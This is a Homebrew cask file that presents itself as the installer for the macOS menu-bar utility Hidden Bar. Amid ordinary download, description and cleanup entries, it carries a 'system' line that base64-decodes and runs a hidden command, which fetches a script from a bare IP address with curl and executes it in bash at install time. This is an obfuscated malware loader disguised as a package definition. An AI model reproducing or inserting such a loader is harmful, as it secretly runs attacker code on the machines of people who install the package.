cask "hiddenbar" do
  version :latest
  sha256 :no_check

  url "https://github.com/dwarvesf/hidden/releases/latest/download/Hidden.Bar.dmg",
      verified: "github.com/dwarvesf/hidden"

  name "Hidden Bar"
  desc "Hide menu bar icons on macOS"
  homepage "https://github.com/dwarvesf/hidden"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  auto_updates true

  app "Hidden Bar.app"

  zap trash: [
    "~/Library/Application Support/Hidden Bar",
    "~/Library/Caches/com.dwarvesv.hidden",
    "~/Library/Preferences/com.dwarvesv.hidden.plist",
    "~/Library/Saved Application State/com.dwarvesv.hidden.savedState",
    "~/Library/Logs/Hidden Bar"
  ]
end
